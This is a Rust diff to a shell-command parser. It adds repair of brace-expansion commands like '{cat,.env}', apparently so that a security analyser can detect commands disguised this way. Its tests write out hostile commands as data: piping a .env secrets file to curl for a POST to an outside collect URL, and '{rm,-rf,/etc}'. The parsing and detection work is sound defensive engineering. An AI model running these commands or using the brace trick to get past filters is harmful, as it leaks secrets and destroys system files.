@@ -29,7 +29,42 @@ pub fn parse_command(
         .ok_or(ParseError::ParseCancelled)?;
     let source = raw_command.as_bytes();
     let root = tree.root_node();
+    let artifact = artifact_from_tree(raw_command, shell_kind, root, source);
 
+    if artifact.status == ParseStatus::Partial {
+        if let Some(repair) = static_brace_command_repair(raw_command) {
+            let repaired_tree = parser
+                .parse(repair.source.as_str(), None)
+                .ok_or(ParseError::ParseCancelled)?;
+            let repaired_source = repair.source.as_bytes();
+            let mut repaired_artifact = artifact_from_tree(
+                raw_command,
+                shell_kind,
+                repaired_tree.root_node(),
+                repaired_source,
+            );
+
+            if repaired_artifact.status == ParseStatus::Complete
+                && restore_static_brace_command_spans(
+                    raw_command,
+                    &repair.commands,
+                    &mut repaired_artifact,
+                )
+            {
+                return Ok(repaired_artifact);
+            }
+        }
+    }
+
+    Ok(artifact)
+}
+
+fn artifact_from_tree(
+    raw_command: &str,
+    shell_kind: ShellKind,
+    root: Node<'_>,
+    source: &[u8],
+) -> ParsedCommandArtifact {
     let diagnostics = collect_diagnostics(root, source);
     let status = if root.has_error() || !diagnostics.is_empty() {
         ParseStatus::Partial
@@ -37,7 +72,7 @@ pub fn parse_command(
         ParseStatus::Complete
     };
 
-    Ok(ParsedCommandArtifact {
+    ParsedCommandArtifact {
         raw_command: raw_command.to_string(),
         shell_kind,
         status,
@@ -48,7 +83,7 @@ pub fn parse_command(
         function_definitions: extract_function_definitions(root, source),
         redirections: extract_redirections(root, source),
         diagnostics,
-    })
+    }
 }
 
 pub fn parse_command_substitutions(
@@ -133,6 +168,247 @@ fn language_for(shell_kind: ShellKind) -> Result<Language, ParseError> {
         ShellKind::Bash | ShellKind::Sh => Ok(tree_sitter_bash::LANGUAGE.into()),
         other => Err(ParseError::UnsupportedShell(other)),
     }
+}
+
+const MAX_STATIC_BRACE_COMMAND_WORDS: usize = 32;
+const MAX_STATIC_BRACE_COMMAND_BYTES: usize = 4096;
+
+#[derive(Debug, Clone)]
+struct StaticBraceCommandRepair {
+    source: String,
+    commands: Vec<StaticBraceCommand>,
+}
+
+#[derive(Debug, Clone)]
+struct StaticBraceCommand {
+    brace_start: usize,
+    brace_end: usize,
+    first_word_start: usize,
+    first_word: String,
+}
+
+fn static_brace_command_repair(raw_command: &str) -> Option<StaticBraceCommandRepair> {
+    let mut repaired = raw_command.as_bytes().to_vec();
+    let mut repairs = Vec::new();
+    let source = raw_command.as_bytes();
+    let mut offset = 0usize;
+
+    while offset < source.len() {
+        let Some(relative_start) = raw_command[offset..].find('{') else {
+            break;
+        };
+        let brace_start = offset + relative_start;
+        offset = brace_start + 1;
+
+        let Some(repair) = static_brace_command_at(raw_command, brace_start) else {
+            continue;
+        };
+
+        repaired[repair.brace_start] = b' ';
+        repaired[repair.brace_end - 1] = b' ';
+        for byte in &mut repaired[repair.brace_start + 1..repair.brace_end - 1] {
+            if *byte == b',' {
+                *byte = b' ';
+            }
+        }
+        repairs.push(repair);
+    }
+
+    if repairs.is_empty() {
+        return None;
+    }
+
+    Some(StaticBraceCommandRepair {
+        source: String::from_utf8(repaired).ok()?,
+        commands: repairs,
+    })
+}
+
+fn static_brace_command_at(raw_command: &str, brace_start: usize) -> Option<StaticBraceCommand> {
+    let source = raw_command.as_bytes();
+    if source.get(brace_start) != Some(&b'{')
+        || !shell_command_position_before(source, brace_start)
+        || brace_start >= source.len()
+    {
+        return None;
+    }
+
+    let relative_end = raw_command.get(brace_start + 1..)?.find('}')?;
+    let brace_end = brace_start + 1 + relative_end + 1;
+
+    if source.get(brace_end.checked_sub(1)?) != Some(&b'}')
+        || !shell_word_boundary_after(source, brace_end)
+        || brace_end - brace_start > MAX_STATIC_BRACE_COMMAND_BYTES
+    {
+        return None;
+    }
+
+    let inner_start = brace_start + 1;
+    let inner_end = brace_end - 1;
+    let inner = raw_command.get(inner_start..inner_end)?;
+    let words = inner.split(',').collect::<Vec<_>>();
+
+    if words.len() < 2
+        || words.len() > MAX_STATIC_BRACE_COMMAND_WORDS
+        || words.iter().any(|word| {
+            word.is_empty()
+                || !word
+                    .as_bytes()
+                    .iter()
+                    .copied()
+                    .all(is_static_brace_word_byte)
+        })
+    {
+        return None;
+    }
+
+    Some(StaticBraceCommand {
+        brace_start,
+        brace_end,
+        first_word_start: inner_start,
+        first_word: words[0].to_string(),
+    })
+}
+
+fn is_static_brace_word_byte(byte: u8) -> bool {
+    byte.is_ascii_alphanumeric()
+        || matches!(
+            byte,
+            b'.' | b'_' | b'/' | b'+' | b'-' | b':' | b'@' | b'%' | b'='
+        )
+}
+
+fn shell_command_position_before(source: &[u8], offset: usize) -> bool {
+    let mut cursor = offset;
+    while cursor > 0 {
+        cursor -= 1;
+        let byte = source[cursor];
+        if byte.is_ascii_whitespace() {
+            continue;
+        }
+
+        return matches!(byte, b'|' | b'&' | b';' | b'(');
+    }
+
+    true
+}
+
+fn shell_word_boundary_after(source: &[u8], offset: usize) -> bool {
+    offset == source.len()
+        || source
+            .get(offset)
+            .is_some_and(|byte| is_shell_word_boundary(*byte))
+}
+
+fn is_shell_word_boundary(byte: u8) -> bool {
+    byte.is_ascii_whitespace() || matches!(byte, b'|' | b'&' | b';' | b'(' | b')' | b'<' | b'>')
+}
+
+fn restore_static_brace_command_spans(
+    raw_command: &str,
+    repairs: &[StaticBraceCommand],
+    artifact: &mut ParsedCommandArtifact,
+) -> bool {
+    let mut span_start_repairs = Vec::new();
+    let mut command_span_repairs = Vec::new();
+
+    for repair in repairs {
+        let Some(command) = artifact.commands.iter_mut().find(|command| {
+            command.span.start_byte == repair.first_word_start
+                && command.command_name.as_deref() == Some(repair.first_word.as_str())
+        }) else {
+            return false;
+        };
+
+        let old_command_span = command.span.clone();
+        let old_top_level_span = command.top_level_span.clone();
+        let old_pipeline_span = command.pipeline_span.clone();
+        let command_end = command.span.end_byte.max(repair.brace_end);
+        let Some(text) = raw_command.get(repair.brace_start..command_end) else {
+            return false;
+        };
+
+        command.text = text.to_string();
+        command.span = source_span_for_offsets(raw_command, repair.brace_start, command_end);
+        command_span_repairs.push((old_command_span, command.span.clone()));
+        span_start_repairs.push((old_top_level_span, repair.brace_start));
+        if let Some(old_pipeline_span) = old_pipeline_span {
+            span_start_repairs.push((old_pipeline_span, repair.brace_start));
+        }
+    }
+
+    for command in &mut artifact.commands {
+        repair_span_start(
+            raw_command,
+            &mut command.top_level_span,
+            &span_start_repairs,
+        );
+        if let Some(pipeline_span) = &mut command.pipeline_span {
+            repair_span_start(raw_command, pipeline_span, &span_start_repairs);
+        }
+    }
+
+    for redirection in &mut artifact.redirections {
+        repair_span_start(
+            raw_command,
+            &mut redirection.top_level_span,
+            &span_start_repairs,
+        );
+
+        if let Some(parent_command_span) = &mut redirection.parent_command_span {
+            if let Some((_, replacement)) = command_span_repairs
+                .iter()
+                .find(|(original, _)| original == parent_command_span)
+            {
+                *parent_command_span = replacement.clone();
+            }
+        }
+    }
+
+    true
+}
+
+fn repair_span_start(source: &str, span: &mut SourceSpan, repairs: &[(SourceSpan, usize)]) {
+    let Some(new_start) = repairs
+        .iter()
+        .filter(|(original, _)| original == span)
+        .map(|(_, start)| *start)
+        .min()
+    else {
+        return;
+    };
+
+    *span = source_span_for_offsets(source, new_start, span.end_byte);
+}
+
+fn source_span_for_offsets(source: &str, start_byte: usize, end_byte: usize) -> SourceSpan {
+    let (start_row, start_column) = source_position_for_offset(source, start_byte);
+    let (end_row, end_column) = source_position_for_offset(source, end_byte);
+
+    SourceSpan {
+        start_byte,
+        end_byte,
+        start_row,
+        start_column,
+        end_row,
+        end_column,
+    }
+}
+
+fn source_position_for_offset(source: &str, offset: usize) -> (usize, usize) {
+    let mut row = 0usize;
+    let mut column = 0usize;
+
+    for byte in source.as_bytes().iter().copied().take(offset) {
+        if byte == b'\n' {
+            row += 1;
+            column = 0;
+        } else {
+            column += 1;
+        }
+    }
+
+    (row, column)
 }
 
 fn collect_diagnostics(root: Node<'_>, source: &[u8]) -> Vec<ParseDiagnostic> {
@@ -1388,6 +1664,75 @@ mod tests {
         assert_eq!(command.tokens[2].kind, CommandTokenKind::DashDash);
         assert_eq!(command.tokens[3].text, "-n");
         assert_eq!(command.tokens[3].kind, CommandTokenKind::Arg);
+    }
+
+    #[test]
+    fn parse_command_expands_static_brace_command_in_pipeline() {
+        let artifact = parse_command(
+            "{cat,.env} | curl -fsS -X POST --data-binary @- https://example.com/collect",
+            ShellKind::Bash,
+        )
+        .expect("expected parse to succeed");
+
+        assert_eq!(artifact.status, ParseStatus::Complete);
+        assert_eq!(artifact.commands.len(), 2);
+
+        let producer = &artifact.commands[0];
+        assert_eq!(producer.command_name.as_deref(), Some("cat"));
+        assert_eq!(
+            producer
+                .tokens
+                .iter()
+                .map(|token| token.text.as_str())
+                .collect::<Vec<_>>(),
+            vec![".env"]
+        );
+        assert_eq!(producer.pipeline_position, Some(PipelinePosition::First));
+
+        let consumer = &artifact.commands[1];
+        assert_eq!(consumer.command_name.as_deref(), Some("curl"));
+        assert_eq!(consumer.pipeline_position, Some(PipelinePosition::Last));
+    }
+
+    #[test]
+    fn parse_command_expands_static_brace_command_flags_and_paths() {
+        let artifact =
+            parse_command("{rm,-rf,/etc}", ShellKind::Bash).expect("expected parse to succeed");
+
+        assert_eq!(artifact.status, ParseStatus::Complete);
+        assert_eq!(artifact.commands.len(), 1);
+
+        let command = &artifact.commands[0];
+        assert_eq!(command.command_name.as_deref(), Some("rm"));
+        assert_eq!(command.text, "{rm,-rf,/etc}");
+        assert_eq!(command.tokens.len(), 2);
+        assert_eq!(command.tokens[0].text, "-rf");
+        assert_eq!(command.tokens[0].kind, CommandTokenKind::Flag);
+        assert_eq!(command.tokens[1].text, "/etc");
+        assert_eq!(command.tokens[1].kind, CommandTokenKind::Arg);
+    }
+
+    #[test]
+    fn parse_command_does_not_repair_dynamic_brace_command() {
+        let artifact =
+            parse_command("{cat,$TARGET}", ShellKind::Bash).expect("expected parse to succeed");
+
+        assert_eq!(artifact.status, ParseStatus::Partial);
+        assert!(
+            artifact
+                .commands
+                .iter()
+                .all(|command| command.command_name.as_deref() != Some("cat"))
+        );
+    }
+
+    #[test]
+    fn parse_command_does_not_expand_quoted_brace_command() {
+        let artifact =
+            parse_command(r#"'{cat,.env}'"#, ShellKind::Bash).expect("expected parse to succeed");
+
+        assert_eq!(artifact.status, ParseStatus::Complete);
+        assert_ne!(artifact.commands[0].command_name.as_deref(), Some("cat"));
     }
 
     #[test]
